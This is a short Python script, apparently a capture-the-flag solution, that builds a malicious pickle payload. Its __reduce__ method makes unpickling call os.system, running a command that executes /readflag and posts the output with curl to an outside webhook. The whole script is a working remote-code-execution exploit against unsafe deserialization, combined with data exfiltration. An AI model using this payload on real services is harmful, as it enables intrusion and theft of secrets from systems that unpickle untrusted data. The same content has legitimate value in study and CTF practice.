import pickle, base64

class RCE():
    def __reduce__(self):
        import os
        return (os.system,(command,))


# Send flag to our webhook
command = '/readflag | curl https://eoeoqhtatvk0tyw.m.pipedream.net/test -X POST -d @-'

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload)
print(len(payload))
